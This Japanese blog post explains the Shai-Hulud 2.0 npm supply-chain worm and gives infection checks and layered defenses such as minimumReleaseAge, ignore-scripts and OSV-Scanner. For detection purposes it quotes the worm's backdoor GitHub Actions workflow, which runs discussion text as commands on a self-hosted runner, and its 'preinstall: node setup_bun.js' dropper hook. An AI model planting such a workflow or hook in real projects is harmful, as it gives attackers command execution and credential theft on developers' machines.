---
title: "【npm】11月21日以降にnpm installした人へ - Shai-Hulud感染チェック & 多層防御ガイド"
source: "https://zenn.dev/hand_dot/articles/04542a91bc432e"
author:
  - "Kyohei Fukuda"
published: 2025-12-04
created: 2025-12-05
description: |
  npm史上最悪のサプライチェーン攻撃「Shai-Hulud 2.0」について解説。正規パッケージのメンテナー認証情報を盗み、悪意あるバージョンをnpmに公開する手口で、11月21日から急速に拡散。被害確認方法と多層防御アプローチ（minimum-release-age、ignore-scripts、SCAツール）を詳しく解説。
tags:
  - npm
  - security
  - supply-chain-attack
  - pnpm
  - OSS
---

## 概要

npm史上最悪のサプライチェーン攻撃「**Shai-Hulud 2.0**」についての解説記事。正規パッケージのメンテナー認証情報を盗み、悪意あるバージョンをnpmに公開するという手口で、**2025年11月21日から急速に拡散**した。

この記事では以下の2点を解説：

1. 自分が被害にあっていないか確認する方法
2. 今後の被害を防ぐ多層防御アプローチ

---

## 被害確認 - あなたは大丈夫か？

**11月21日以降にnpm installを実行した人は、感染の可能性がある。**

### チェック1: GitHubアカウントの確認（ブラウザで完結）

#### 確認ポイント1: 見覚えのないリポジトリ

Shai-Huludは感染したアカウントにランダムな名前のパブリックリポジトリを作成し、窃取した認証情報を公開する。

```
https://github.com/[あなたのユーザー名]?tab=repositories
```

descriptionに「**Sha1-Hulud: The Second Coming**」という文字列が含まれていたら**確実にアウト**。

#### 確認ポイント2: 不審なワークフローファイル

GitHubのコード検索で、自分のリポジトリ内に `discussion.yaml` がないか確認。

```
https://github.com/search?q=owner%3A[あなたのユーザー名や組織名]+path%3A.github%2Fworkflows%2Fdiscussion.yaml&type=code
```

この `discussion.yaml` は感染時にGitHub Actionsに追加されるワークフロー。**メインの被害はこちらなので、確実にチェックすること。**

不審なワークフローの例：

```yaml
name: Discussion Create
on:
  discussion:
jobs:
  process:
    env:
      RUNNER_TRACKING_ID: 0
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v5
      - name: Handle Discussion
        run: echo ${{ github.event.discussion.body }}
```

このワークフローにより、GitHubリポジトリでディスカッションを開始することで、感染したマシン上で任意のコマンドを実行可能になる。

#### 確認ポイント3: セルフホストランナー

各リポジトリの Settings → Actions → Runners を開いて、「**SHA1HULUD**」という名前のセルフホストランナーが登録されていないか確認。

自分のPCがあったら**感染している**。即座に削除して、全認証情報をローテーションすること。

---

### チェック2: ローカル環境の確認

npmプロジェクトがある開発ディレクトリ等で以下のファイルを検索。

| ファイル名 | 説明 |
| --- | --- |
| `setup_bun.js` | ドロッパー |
| `bun_environment.js` | メインペイロード（10MB以上の難読化ファイル） |
| `cloud.json` | AWS/GCP/Azure認証情報 |
| `environment.json` | 環境変数 |
| `actionsSecrets.json` | GitHub Actions シークレット |

検索コマンド：

```bash
find ./ -name "setup_bun.js" -o -name "bun_environment.js" \
  -o -name "cloud.json" -o -name "actionsSecrets.json" 2>/dev/null
```

---

### チェック3: npmパッケージの確認（パッケージ公開者向け）

npmにパッケージを公開している場合、バージョン履歴を確認。2025年11月21日以降に、公開した覚えのないバージョンがないか？

```bash
npm view [あなたのパッケージ名] time
```

身に覚えのない時刻のものがあれば要注意。

---

### 被害が確認できた場合

即座に以下を実行：

1. **全トークンのローテーション** - npm、GitHub、AWS、GCP、Azureなど
2. **不審なリポジトリの削除**
3. **セルフホストランナーの削除**
4. **ワークフローファイルの削除**
5. **プライベートリポジトリの公開設定確認** - 強制的にパブリック化されていないか

---

## 防御方法 - 多層防御アプローチ

### Shai-Hulud型攻撃の特徴

- 正規パッケージのメンテナー認証情報が盗まれる
- 悪意あるバージョンがnpmに公開される
- 既存ユーザーがnpm install / npm updateで感染する

**これまで普通に使用していたライブラリが突然攻撃の入口に変わる。**

### 多層防御の考え方

| 層 | 対策 | 内容 | 防御対象 |
| --- | --- | --- | --- |
| 層1 | 入れない | minimum-release-age | ゼロデイ攻撃 |
| 層2 | 実行させない | ignore-scripts | 悪意あるスクリプト実行 |
| 層3 | 見逃さない | SCAツール | 既知の脆弱性 |

---

### 層1: minimum-release-age - ゼロデイ対策

**SCAツールは「既知の脆弱性」しか検知できない。** Advisoryが発行されるまで、ゼロデイ攻撃に対しては無力。

**解決策：時間を味方につける。**

#### pnpmユーザー向け: minimumReleaseAge

`pnpm-workspace.yaml` に設定を追加：

```yaml
minimumReleaseAge: 2880
```

「**公開から2880分（2日）経ってないバージョンはインストール拒否**」という設定（値は分単位）。

悪意あるパッケージは多くのケースで公開から数日以内に発見される。2,3日待てば、多くの攻撃は既に検知・公表されている。

> ⚠️ 緊急のセキュリティパッチが必要な場合は一時的に解除する必要がある

#### npm/yarn/bunユーザー向け: Aikido Safe Chain

[Aikido Safe Chain](https://github.com/AikidoSec/safe-chain) はnpm、yarn、pnpm、bun全てに対応。

```bash
# インストール
npm install -g @aikidosec/safe-chain

# シェル統合のセットアップ
safe-chain setup

# ターミナル再起動後、通常通りnpmを使うだけ
npm install express
```

**2つの機能：**

1. **24時間ルール**: デフォルトで公開から24時間以内のパッケージはインストールをブロック
2. **マルウェア検知**: Aikido Intelデータベースに対してリアルタイムで検証

無料で、トークンも不要。CI/CDにも簡単に組み込める：

```yaml
- name: Setup safe-chain
  run: |
    npm i -g @aikidosec/safe-chain
    safe-chain setup-ci

- name: Install dependencies
  run: npm ci
```

---

### 層2: ignore-scripts - 最終防衛線

Shai-Hulud 2.0は **preinstallスクリプト**を起点として感染する。

```json
{
  "scripts": {
    "preinstall": "node setup_bun.js"
  }
}
```

`.npmrc` に設定を追加：

```
ignore-scripts=true
```

これにより、悪意あるパッケージをインストールしてもpreinstallスクリプトは動かない。**これが最終防衛線。**

> [OWASP NPM Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/NPM_Security_Cheat_Sheet.html) にも記載されている推奨設定

#### ネイティブモジュールへの対応

bcrypt、sqlite3、sharpなどのネイティブモジュールはpostinstallスクリプトでコンパイルが必要。

**解決策：ホワイトリスト方式** - デフォルトで全てブロックし、必要なパッケージだけ許可する。

##### pnpm v10の場合（デフォルトで安全）

pnpm v10から、**依存パッケージのライフサイクルスクリプトはデフォルトで実行されない**。

ネイティブモジュールを使う場合は `package.json` で許可：

```json
{
  "pnpm": {
    "onlyBuiltDependencies": ["esbuild", "sharp"]
  }
}
```

##### npmの場合（@lavamoat/allow-scripts）

[@lavamoat/allow-scripts](https://github.com/LavaMoat/LavaMoat/tree/main/packages/allow-scripts) を使用（OWASP推奨）。

```bash
npm install @lavamoat/allow-scripts
```

```json
{
  "lavamoat": {
    "allowScripts": {
      "sharp": true,
      "bcrypt": true
    }
  }
}
```

---

### 層3: SCAツール - 既知の脆弱性を検知する

#### OSV-Scanner

[OSV-Scanner](https://google.github.io/osv-scanner/) はGoogleが運営するOSV（Open Source Vulnerabilities）データベースを使った脆弱性スキャナー。

**npm auditとの違い：**

- npm auditはnpmのAdvisory DBのみ
- OSV-ScannerはGitHub Advisory、NVD、その他複数のソースを統合 → **カバー範囲が広い**

完全にオープンソースで無料。

```bash
# インストール
brew install osv-scanner

# スキャン
osv-scanner --lockfile package-lock.json
```

CI/CD組み込み：

```yaml
- name: Run OSV-Scanner
  uses: google/osv-scanner-action@v1
  with:
    scan-args: --lockfile package-lock.json
```

---

## まとめ：やること3つ

| 優先度 | 対策 | ツール |
| --- | --- | --- |
| 1 | 新しすぎる or 怪しいパッケージをブロック | Aikido Safe Chain |
| 2 | インストールスクリプトを無効化 | npm: `ignore-scripts` + `@lavamoat/allow-scripts`<br>pnpm v10: デフォルト |
| 3 | 継続的にスキャン | OSV-Scanner |

**完璧な防御は存在しないが、いくつかの対策を組み合わせることで攻撃の可能性を大幅に減らせる。**

---

## 補足：Cursorなどのエディタ拡張経由の感染経路

コメント欄からの重要な補足（[dnpp氏](https://zenn.dev/dnpp)による報告）：

> npmを使っていなくても問題になるケースがある。今回はCursorなどのエディタ拡張に悪意のあるコードが混入され、**Cursorを起動するだけで勝手に拡張がアップデートされて感染するという経路**があった。
>
> 詳細：[AsyncAPI Post-mortem](https://www.asyncapi.com/blog/shai-hulud-postmortem)
>
> この拡張の中で `npm install github:asyncapi/cli#2efa4dff59bc3d3cecdf897ccf178f99b115d63d` が実行され、開発環境のエディタという比較的強い権限で動作しているプロセスからマルウェアが実行される形。

VSCodeフォークなAIエディタを使っているだけで被害を受ける可能性があるため、注意が必要。

---

## 参考リンク

- [OSV-Scanner](https://google.github.io/osv-scanner/)
- [Aikido Safe Chain](https://github.com/AikidoSec/safe-chain)
- [@lavamoat/allow-scripts](https://github.com/LavaMoat/LavaMoat/tree/main/packages/allow-scripts)
- [Wiz Blog - Shai-Hulud 2.0](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack)
- [OWASP NPM Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/NPM_Security_Cheat_Sheet.html)
- [pnpm minimumReleaseAge](https://pnpm.io/settings#minimumreleaseage)
- [AsyncAPI Post-mortem](https://www.asyncapi.com/blog/shai-hulud-postmortem)
